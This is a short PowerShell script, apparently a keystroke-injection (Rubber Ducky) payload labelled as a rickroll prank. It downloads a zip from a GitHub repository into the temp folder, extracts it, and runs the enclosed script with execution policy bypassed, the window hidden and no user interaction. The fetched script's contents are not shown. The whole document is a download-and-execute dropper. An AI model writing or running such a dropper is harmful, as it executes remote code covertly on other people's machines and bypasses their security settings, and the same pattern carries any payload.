$U='https://github.com/JestingDart4369/Ducky-script-public/blob/main/Windows-rickroll-vido.zip?raw=true'
$Z="$env:TMP"+'\Windows-rickroll-vido.zip'
$D="$env:TMP"+'\Windows-rickroll-video'
iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
$c= join-path $d -childpath /Windows-rickroll-vido/Windows-rickroll-video-player.ps1

powershell -exec Bypass -w h -NoP -NonI $c